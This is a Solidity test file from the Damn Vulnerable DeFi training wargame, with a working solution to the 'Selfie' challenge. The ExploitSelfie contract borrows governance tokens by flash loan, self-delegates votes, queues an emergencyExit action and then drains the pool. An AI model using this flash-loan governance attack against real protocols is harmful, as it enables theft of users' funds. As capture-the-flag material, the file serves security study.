// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        
        console.log("Nonce of Player: ", vm.getNonce(player));
        ExploitSelfie exploitSelfie = new ExploitSelfie();
          console.log("Nonce of Player: ", vm.getNonce(player));
        exploitSelfie.attack(pool, token, TOKENS_IN_POOL - 1, recovery);
                console.log("Nonce of Player: ", vm.getNonce(player));

        vm.warp(block.timestamp + 2 days);
        pool.governance().executeAction(1);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}


import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
contract ExploitSelfie is IERC3156FlashBorrower {
    SelfiePool pool;
    constructor(){}
    function attack(SelfiePool _pool, DamnValuableVotes _token, uint256 tokensInPool, address recovery) public{
        pool = _pool;   
  
        bytes memory data = abi.encodeCall(pool.emergencyExit, (recovery));
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(_token),  tokensInPool, data);
        
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32){   
        DamnValuableVotes votingToken = DamnValuableVotes(token);
        votingToken.delegate(address(this));
        
        SimpleGovernance simpleGovernance = pool.governance();
        simpleGovernance.queueAction(address(pool), 0, data);
        votingToken.approve(address(pool), votingToken.balanceOf(address(this)));
        return bytes32(keccak256("ERC3156FlashBorrower.onFlashLoan"));
    }

}
